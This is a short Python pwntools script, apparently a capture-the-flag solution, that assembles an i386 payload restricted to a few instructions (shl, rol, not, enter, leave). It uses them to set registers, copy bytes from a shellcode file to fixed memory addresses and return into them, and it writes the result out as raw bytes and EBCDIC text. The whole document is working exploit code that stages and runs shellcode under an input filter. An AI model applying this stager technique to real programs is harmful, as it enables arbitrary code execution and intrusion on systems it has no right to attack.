from pwn import asm, context
import struct
from itertools import groupby

context.update(arch="i386")

payload = []

def set_reg(reg, val):
    # clear register
    payload.append(f"shl {reg}, 0xf9")
    payload.append(f"shl {reg}, 0xc7")

    # set all bits, then clear selected bits using shl
    payload.append(f"not {reg}")
    bitgroups = [(k, len(list(g))) for k, g in groupby("{:032b}".format(val))]
    for bit, bitlen in bitgroups:
        opc = ["shl", "rol"][int(bit)]
        while bitlen:
            chunklen = min(9, bitlen)
            payload.append(f"{opc} {reg}, 0xc{chunklen}")
            bitlen -= chunklen

shellcode = open("shellcode-x86", "rb").read().ljust(32, b"\x90")
for i in reversed(range(0, 32, 4)):
    set_reg("esp", 0x8057000 + i + 4)
    set_reg("ebp", struct.unpack("<I", shellcode[i:i+4])[0])
    payload.append("enter 0xc1c8, 0xc1")
    payload.append("leave")

set_reg("esp", 0x8056000 + 4)
set_reg("ebp", 0x8057000)
payload.append("enter 0xc1c8, 0xc1")
payload.append("leave")

set_reg("esp", 0x8056000)
payload.append("ret")

code = asm("\n".join(payload))
with open("solution.bin", "wb") as outf:
    outf.write(code)
with open("solution.txt", "w") as outf:
    outf.write(code.decode("cp037"))
    outf.write("\n")
